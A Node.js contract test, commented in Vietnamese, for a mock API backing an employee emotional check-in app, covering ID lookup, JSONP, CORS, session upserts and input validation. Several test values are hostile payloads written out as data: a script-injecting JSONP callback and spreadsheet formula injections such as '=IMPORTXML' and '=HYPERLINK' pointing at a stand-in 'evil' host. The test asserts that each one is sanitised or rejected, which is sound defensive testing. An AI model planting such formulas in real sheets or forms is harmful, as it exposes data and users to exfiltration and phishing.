/* =========================================================
   Contract test cho tools/mock-api.js (QA) – mock phải giống google_apps_script.js
   để frontend test local tin được. Chạy mock trên cổng riêng 8790, dữ liệu ghi vào
   thư mục tạm qua biến MOCK_DATA (không đụng thư mục Google Drive), tắt khi xong.
   Chạy: node tests/test-mock-api.js
   ========================================================= */
'use strict';
const { spawn } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

const APP = path.resolve(__dirname, '..');
const PORT = 8790;
const RUN_DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'checkin-mock-'));
const DATA = path.join(RUN_DIR, 'mock-data.json');
const URL_ = 'http://127.0.0.1:' + PORT + '/';
const sleep = ms => new Promise(r => setTimeout(r, ms));

let fails = 0;
const T = (name, ok, detail) => { if (!ok) fails++; console.log((ok ? 'PASS ' : 'FAIL ') + name + (detail !== undefined ? '  → ' + String(detail).slice(0, 200) : '')); };
const get = async (qs, raw) => { const r = await fetch(URL_ + qs); return raw ? { ct: r.headers.get('content-type'), text: await r.text(), cors: r.headers.get('access-control-allow-origin') } : r.json(); };
const post = async body => (await fetch(URL_, { method: 'POST', headers: { 'Content-Type': 'text/plain;charset=utf-8' }, body: typeof body === 'string' ? body : JSON.stringify(body) })).json();

(async () => {
  const child = spawn(process.execPath, [path.join(APP, 'tools', 'mock-api.js')], { env: Object.assign({}, process.env, { PORT: String(PORT), MOCK_DATA: DATA }), stdio: ['ignore', 'pipe', 'pipe'] });
  let log = ''; child.stdout.on('data', d => { log += d; }); child.stderr.on('data', d => { log += d; });
  try {
    let up = false;
    for (let i = 0; i < 100 && !up; i++) { try { up = (await get('?action=ping')).pong === true; } catch (e) { await sleep(100); } }
    T('mock khởi động trên cổng ' + PORT, up, log.trim());
    T('mock in đường dẫn file dữ liệu (MOCK_DATA) lúc khởi động', log.includes(DATA), log.trim());
    T('mock không tạo tools/mock-data.json trong thư mục app', !fs.existsSync(path.join(APP, 'tools', 'mock-data.json')));

    T('GET ?action=ping → pong', JSON.stringify(await get('?action=ping')) === '{"result":"success","pong":true}');
    T('GET không action → public_read_disabled (không lộ CheckIn)', (await get('')).error === 'public_read_disabled');
    T('GET ?action=dump → unknown_action', (await get('?action=dump')).error === 'unknown_action');
    T('GET ?action=list / all → không có API liệt kê DanhSach', (await get('?action=list')).error === 'unknown_action' && (await get('?action=all')).error === 'unknown_action');
    T('lookup 1001 → Nguyễn Thị Hạnh', JSON.stringify(await get('?action=lookup&id=1001')) === '{"result":"success","found":true,"name":"Nguyễn Thị Hạnh"}');
    T('lookup " 10-01 " (chuẩn hóa) → Hạnh', (await get('?action=lookup&id=' + encodeURIComponent(' 10-01 '))).name === 'Nguyễn Thị Hạnh');
    T('lookup a123 (chữ thường) → Phạm Quốc Bảo', (await get('?action=lookup&id=a123')).name === 'Phạm Quốc Bảo');
    T('lookup 9999 → found:false, không name', JSON.stringify(await get('?action=lookup&id=9999')) === '{"result":"success","found":false}');
    T('lookup id "--" → reason id_empty', (await get('?action=lookup&id=--')).reason === 'id_empty');
    T('lookup id full-width １００１ → không khớp', (await get('?action=lookup&id=' + encodeURIComponent('１００１'))).found === false);
    T('lookup không id → id_empty', (await get('?action=lookup')).reason === 'id_empty');
    const jp = await get('?action=lookup&id=1002&callback=__capyLookup3', true);
    T('JSONP: text/javascript + gọi đúng tên hàm', /javascript/.test(jp.ct) && jp.text === '__capyLookup3({"result":"success","found":true,"name":"Trần Văn Minh"});', jp.text);
    const jpBad = await get('?action=ping&callback=' + encodeURIComponent('x();alert(1)//'), true);
    T('JSONP: callback bẩn bị lọc còn chữ/số', jpBad.text.startsWith('xalert1('), jpBad.text);
    T('CORS: Access-Control-Allow-Origin *', (await get('?action=ping', true)).cors === '*');

    /* POST: upsert theo sessionId */
    const base = { created_at: '', sessionId: 'qa-session-0001', employeeId: ' 10-01 ', name: 'Nguyễn Thị Hạnh', level: 7, levelText: 'Ổn', emotion: 'Lo lắng' };
    const r1 = await post(base);
    T('POST lần 1 → inserted row 2', r1.result === 'success' && r1.action === 'inserted' && r1.row === 2, JSON.stringify(r1));
    const r2 = await post(Object.assign({}, base, { level: 8, emotion: 'Buồn' }));
    T('POST cùng sessionId (bấm đúp) → updated cùng row 2, không thêm dòng', r2.action === 'updated' && r2.row === 2, JSON.stringify(r2));
    const r3 = await post(Object.assign({}, base, { sessionId: 'qa-session-0002', employeeId: '9999', name: '' }));
    T('POST sessionId khác → inserted row 3', r3.action === 'inserted' && r3.row === 3, JSON.stringify(r3));
    await sleep(200);
    const rows = JSON.parse(fs.readFileSync(DATA, 'utf8'));
    T('mock-data.json: 2 dòng, 7 cột đúng thứ tự Sheet', rows.length === 2 && rows.every(r => Object.keys(r).join(',') === 'created_at,employeeId,name,level,levelText,emotion,sessionId'), JSON.stringify(rows.map(r => Object.keys(r).join(','))));
    T('dòng 1 sau update: employeeId "1001", level 8 số, emotion Buồn, created_at tự điền HH:mm:ss dd/MM/yyyy', rows[0].employeeId === '1001' && rows[0].level === 8 && rows[0].emotion === 'Buồn' && /^\d\d:\d\d:\d\d \d\d\/\d\d\/\d{4}$/.test(rows[0].created_at), JSON.stringify(rows[0]));
    T('dòng 2: mã 9999, tên rỗng', rows[1].employeeId === '9999' && rows[1].name === '', JSON.stringify(rows[1]));
    T('POST level 11 → level_invalid', (await post(Object.assign({}, base, { sessionId: 'qa-session-0003', level: 11 }))).error === 'level_invalid');
    T('POST level 0 → level_invalid', (await post(Object.assign({}, base, { sessionId: 'qa-session-0003', level: 0 }))).error === 'level_invalid');
    T('POST level "7" chuỗi → chấp nhận', (await post(Object.assign({}, base, { sessionId: 'qa-session-0004', level: '7' }))).result === 'success');
    T('POST emotion rỗng → emotion_required', (await post(Object.assign({}, base, { sessionId: 'qa-session-0005', emotion: '  ' }))).error === 'emotion_required');
    T('POST sessionId 5 ký tự → session_invalid', (await post(Object.assign({}, base, { sessionId: 'abcde' }))).error === 'session_invalid');
    T('POST JSON hỏng → bad_json', (await post('{oops')).error === 'bad_json');
    T('POST rỗng → no_data', (await post('')).error === 'no_data');
    T('POST name client dài 200 ký tự → bị bỏ, cột Tên lấy từ danh sách (1001 → Hạnh)', (await (async () => { await post(Object.assign({}, base, { sessionId: 'qa-session-0006', name: 'A'.repeat(200) })); await sleep(150); const r = JSON.parse(fs.readFileSync(DATA, 'utf8')); return r[r.length - 1].name === 'Nguyễn Thị Hạnh'; })()));
    T('GET sau khi có dữ liệu vẫn public_read_disabled', (await get('')).error === 'public_read_disabled');

    /* Chống formula injection – giống google_apps_script.js */
    const last = async () => { await sleep(150); const r = JSON.parse(fs.readFileSync(DATA, 'utf8')); return r[r.length - 1]; };
    T('POST emotion "=1+1" → emotion_invalid', (await post(Object.assign({}, base, { sessionId: 'qa-inj-0001', emotion: '=1+1' }))).error === 'emotion_invalid');
    T('POST đủ 6 nhãn cảm xúc → nhận', (await Promise.all(['Vui vẻ', 'Buồn', 'Lo lắng', 'Tức giận', 'Hoảng hốt', 'Khó chịu'].map((e, i) => post(Object.assign({}, base, { sessionId: 'qa-inj-emo-' + i, emotion: e }))))).every(r => r.result === 'success'));
    let rr = await post(Object.assign({}, base, { sessionId: 'qa-inj-0002', level: 3, levelText: '=HYPERLINK("http://evil";"bấm")' }));
    let row = await last();
    T('POST levelText "=HYPERLINK(...)" → thay bằng "Hơi mệt" (level 3)', rr.result === 'success' && row.levelText === 'Hơi mệt', JSON.stringify(row));
    T('POST sessionId \'=HYPERLINK("x";"y")\' → session_invalid', (await post(Object.assign({}, base, { sessionId: '=HYPERLINK("x";"y")' }))).error === 'session_invalid');
    T('POST sessionId UUID → nhận', (await post(Object.assign({}, base, { sessionId: '3f2b9c1a-7d4e-4b6a-9c2d-1e5f6a7b8c9d' }))).result === 'success');
    rr = await post(Object.assign({}, base, { sessionId: 'qa-inj-0004', created_at: '=NOW()' }));
    row = await last();
    T('POST created_at "=NOW()" → giờ server đúng khuôn', rr.result === 'success' && /^\d\d:\d\d:\d\d \d\d\/\d\d\/\d{4}$/.test(row.created_at), JSON.stringify(row));
    await post(Object.assign({}, base, { sessionId: 'qa-inj-0006', created_at: '06:45:10 27/10/2026' }));
    T('POST created_at đúng khuôn → giữ nguyên', (await last()).created_at === '06:45:10 27/10/2026');
    rr = await post(Object.assign({}, base, { sessionId: 'qa-inj-0007', employeeId: '1002', name: '=IMPORTXML("http://evil";"//a")' }));
    row = await last();
    T('POST name "=IMPORTXML(...)" mã 1002 → cột Tên "Trần Văn Minh" (tra server)', rr.result === 'success' && row.name === 'Trần Văn Minh', JSON.stringify(row));
    rr = await post(Object.assign({}, base, { sessionId: 'qa-inj-0008', employeeId: '9999', name: '=IMPORTXML("http://evil";"//a")' }));
    row = await last();
    T('POST name "=IMPORTXML(...)" mã không có → cột Tên rỗng', rr.result === 'success' && row.name === '', JSON.stringify(row));
    const all = JSON.parse(fs.readFileSync(DATA, 'utf8'));
    T('Không ô chuỗi nào trong dữ liệu bắt đầu bằng = + - @', all.every(r => Object.values(r).every(v => typeof v !== 'string' || !/^[=+\-@\t\r]/.test(v))));

    /* Lần 2: thêm vài ca khớp với client thật */
    T('POST sessionId dạng dự phòng của app (base36-base36, vd "mvpossqf-gcesj1x0") → nhận', (await post(Object.assign({}, base, { sessionId: 'mvpossqf-gcesj1x0' }))).result === 'success');
    T('POST sessionId đúng 8 ký tự → nhận; 7 ký tự → session_invalid', (await post(Object.assign({}, base, { sessionId: 'abcd1234' }))).result === 'success' && (await post(Object.assign({}, base, { sessionId: 'abcd123' }))).error === 'session_invalid');
    T('POST emotion có khoảng trắng hai đầu " Buồn " → nhận, ghi "Buồn"', (await post(Object.assign({}, base, { sessionId: 'qa-trim-0001', emotion: ' Buồn ' }))).result === 'success' && (await last()).emotion === 'Buồn');
    T('POST emotion sai hoa/thường "vui vẻ" → emotion_invalid', (await post(Object.assign({}, base, { sessionId: 'qa-trim-0002', emotion: 'vui vẻ' }))).error === 'emotion_invalid');
    T('POST employeeId "=1+1" → chuẩn hóa còn "11", không còn dấu =', (await post(Object.assign({}, base, { sessionId: 'qa-inj-0011', employeeId: '=1+1' }))).result === 'success' && (await last()).employeeId === '11');
    T('POST level "abc" → level_invalid', (await post(Object.assign({}, base, { sessionId: 'qa-inj-0012', level: 'abc' }))).error === 'level_invalid');
    T('POST body là mảng JSON [1,2] → bad_json (review lần 2, giống Apps Script)', (await post('[1,2]')).error === 'bad_json');
    T('GET lookup có callback → JSONP cho cả nhánh lỗi (id rỗng)', (await get('?action=lookup&callback=cb1', true)).text === 'cb1({"result":"success","found":false,"reason":"id_empty"});');
    /* Khởi động lại mock với cùng MOCK_DATA → nạp lại dữ liệu cũ (không mất lượt đã ghi) */
    const nRows = JSON.parse(fs.readFileSync(DATA, 'utf8')).length;
    child.kill();
    await sleep(400);
    const child2 = spawn(process.execPath, [path.join(APP, 'tools', 'mock-api.js')], { env: Object.assign({}, process.env, { PORT: String(PORT), MOCK_DATA: DATA }), stdio: ['ignore', 'pipe', 'pipe'] });
    let log2 = ''; child2.stdout.on('data', d => { log2 += d; });
    let up2 = false;
    for (let i = 0; i < 100 && !up2; i++) { try { up2 = (await get('?action=ping')).pong === true; } catch (e) { await sleep(100); } }
    T('Khởi động lại mock cùng MOCK_DATA → nạp lại ' + nRows + ' dòng sẵn có', up2 && log2.includes(nRows + ' dòng sẵn có'), log2.trim().split('\n')[0]);
    const rAgain = await post(base);
    T('Sau khởi động lại: POST cùng sessionId cũ → updated row 2 (upsert vẫn nhớ)', rAgain.action === 'updated' && rAgain.row === 2, JSON.stringify(rAgain));
    child2.kill();
    await sleep(300);
  } catch (e) {
    fails++; console.log('CRASH ' + (e && e.stack || e));
  } finally {
    child.kill();
    await sleep(300);
    fs.rmSync(RUN_DIR, { recursive: true, force: true });
    try { fs.unlinkSync(path.join(APP, 'tools', 'mock-data.json')); } catch (e) { /* không có */ }
  }
  console.log('\n' + (fails ? fails + ' FAIL' : 'ALL PASS'));
  process.exit(fails ? 1 : 0);
})();
